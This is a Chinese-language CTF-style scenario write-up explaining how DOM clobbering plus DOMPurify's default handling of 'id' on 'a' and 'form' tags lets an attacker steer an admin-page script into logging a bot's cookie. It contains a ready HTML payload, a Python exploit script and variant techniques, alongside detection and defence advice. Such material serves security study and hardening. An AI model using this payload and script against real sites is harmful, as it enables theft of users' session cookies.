---
id: web-generic-xss-dom-clobbering-window-globals-config-exfil
title: DOM Clobbering 劫持 window 配置变量 + DOMPurify 放行 form 导致 bot cookie 外带
type: scenario
domain: web
path: web/generic/xss
technique: dom-clobbering-window-globals-form-action-exfil
aliases:
- DOM Clobbering window 变量
- DOMPurify form id 绕过
- window.AUTO_SHARE 劫持
- form action 路径穿越
- bot cookie 外带
tags:
- web
- xss
- dom-clobbering
- dompurify
- dom
- bot
- cookie
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:52+08:00'
  notes: 已对照原文 admin.js/bot.js/server.js 核对；DOMPurify 双层过滤与 cookie path 一致；PoC 未复跑。
---

## 一句话结论

当管理页脚本从 `window.AUTO_SHARE`、`window.CONFIG_PATH`、`window.CONFIG_COOKIE_DEBUG` 读取配置，而内容又经过 DOMPurify（默认允许带 `id` 的 `a`/`form`）时，可用 `<a id="AUTO_SHARE">`、`<form id="CONFIG_PATH" action="../../log">` 等 DOM Clobbering 把全局变量变成 DOM 元素，让脚本把 `document.cookie` 发到 `/log`，再通过 `/logs` 取回 bot 的 flag cookie。

## 原理

- **DOM Clobbering**：浏览器会把带 `id`（以及部分 `name`）的 HTML 元素挂到 `window` 上，例如 `<a id="AUTO_SHARE">` 使 `window.AUTO_SHARE` 指向该元素。脚本若直接读 `window.X` 判断配置，就会拿到元素对象而不是预期值。
- **DOMPurify 的默认放行面**：DOMPurify 默认会移除 `<script>` 等可执行标签，但保留 `a`、`form` 等结构标签及其 `id`、`action` 属性。服务端在创建文章时做了一次 `DOMPurify.sanitize(content)`，管理页又做一次，payload 仍能存活。
- **配置判断的宽松性**：`asBool(v)` 对对象返回 `!!v`，因此 `window.AUTO_SHARE` 为元素时视为 `true`；`asPath(v)` 对元素优先取 `v.getAttribute('action')`，`<form>` 天然有 `action` 属性，因此 `window.CONFIG_PATH` 可控制路径。
- **路径穿越**：`buildTarget('/analytics', '../../log')` 把 base 和 sub 拼成 `/analytics/../../log`，逐段处理 `..` 后得到 `/log`；这正是服务端记录日志的接口。
- **Cookie 外带**：`includeCookie` 为 `true` 时，脚本把 `document.cookie` 放进查询参数 `c`；bot 的 FLAG cookie 设置为 `path=/admin`、`httpOnly=false`，而管理页 URL 是 `/admin/review/<id>`，路径匹配，`document.cookie` 能读到。`fetch('/log?...&c=...')` 把 cookie 写入服务端 `logs` 数组，攻击者请求 `/logs` 即可取回。
- 根因是“用全局变量名做配置 + 允许用户 HTML 注入可命名元素 + bot 持有敏感 cookie 且可被 JS 读取”。

## 触发条件

- 前端脚本从 `window.<NAME>` 读取配置/开关，而不是从显式对象、`data-*` 或服务端注入的常量读取。
- 用户可控 HTML 经过的清洗器允许 `id`/`name` 属性以及 `a`、`form` 等可 clobber 的标签（DOMPurify 默认配置即可能如此）。
- 存在 bot 访问攻击者内容的流程，且 bot 在目标域持有敏感 cookie（flag/session）。
- 脚本存在可被配置影响的请求目标/参数，例如把路径拼进 `fetch` 并在开关打开时带 `document.cookie`。
- cookie 未设置 `HttpOnly`，或攻击者可通过其他方式读取（本例外带依赖 `httpOnly:false`）。

## 利用步骤

1. 阅读管理页脚本，找出所有 `window.<NAME>` 读取点及其后续请求逻辑（目标 URL、查询参数、是否带 cookie）。
2. 构造 HTML：用 `<a id="AUTO_SHARE"></a>`、`<a id="CONFIG_COOKIE_DEBUG"></a>` 让布尔判断为真；用 `<form id="CONFIG_PATH" action="../../log"></form>` 控制路径。
3. 通过发帖接口提交 payload；确认服务端 DOMPurify 没有移除 `id`/`form`/`action`。
4. 触发 bot 访问该文章的管理审核页；bot 携带 flag cookie 执行脚本，向 `/log` 发出带 `c=document.cookie` 的请求。
5. 请求 `/logs` 读取日志数组，取出 flag。

## PoC

```html
<a id="AUTO_SHARE"></a>
<a id="CONFIG_COOKIE_DEBUG"></a>
<form id="CONFIG_PATH" action="../../log"></form>
```

```python
import requests, time

url = "http://target"
payload = ('<a id="AUTO_SHARE"></a>'
           '<a id="CONFIG_COOKIE_DEBUG"></a>'
           '<form id="CONFIG_PATH" action="../../log"></form>')

pid = requests.post(f"{url}/api/posts", json={"title": "x", "content": payload}).json()["id"]
requests.get(f"{url}/bot", params={"id": pid})
time.sleep(4)
logs = requests.get(f"{url}/logs").json()["logs"]
print(logs)  # 其中 cookie 字段包含 bot 的 FLAG
```

## 变体与关联

- 变体：clobber 其它全局名（`window.config`、`window.user`、`window.CONFIG`），或利用多层 `form`/`input name` 构造 `window.x.y` 结构；`<base>`、`<img name>` 等也可参与。
- 变体：路径穿越目标换成任意同源接口（如 `/api/...`），把 cookie/token 写进日志、评论、头像 URL 等可回读位置；也可用 `fetch` 直接外带到攻击者域（受 CORS/CSP 限制）。
- 变体：DOMPurify 版本/配置允许 `style`、`svg`、`math` 时，可结合 mXSS；若 `id`/`name` 被过滤，尝试 `SANITIZE_NAMED_PROPS` 未开启的旧版本或其他命名属性。
- 关联：[[web-generic-xss-dom-clobbering-window-name-collision]]（window.name 冲突）、[[web-generic-xss-dompurify-parentnode-clobbering-depth-bypass]]（DOMPurify clobbering 深度绕过）、[[web-generic-xss-admin-blind-stored-registration]]（bot 管理页存储 XSS）。
- 边界：脚本使用显式配置对象/`data-*`、DOMPurify 禁止 `id`/`name` 或启用 `SANITIZE_NAMED_PROPS`、cookie 为 `HttpOnly`、bot 不访问用户内容或 CSP 阻止外连时，本链失效。

## 检测与防御

- 不要从 `window.<NAME>` 读取安全相关配置；使用模块内常量、显式配置对象或 `data-*` 属性，并在读取时校验类型。
- DOMPurify 配置 `FORBID_ATTR: ['id', 'name']`、`ALLOWED_ATTR` 白名单，或启用 `SANITIZE_NAMED_PROPS`；对用户 HTML 做更严格的结构白名单。
- 敏感 cookie 设置 `HttpOnly`、`Secure`、`SameSite`，bot 使用的 flag/session 不应能被页面 JS 读取；管理页与用户内容使用不同源/隔离域。
- 对 bot 访问的 URL 做白名单/同源校验，限制页面发起的请求目标；CSP 限制 `connect-src`。
- 检测：用户内容中出现 `<a id=`、`<form id=`、`action=`、`name=` 等 clobbering 结构；`/log` 出现带 `c=` cookie 的请求；`/logs` 被异常读取；bot 访问后短时间内出现外带请求。
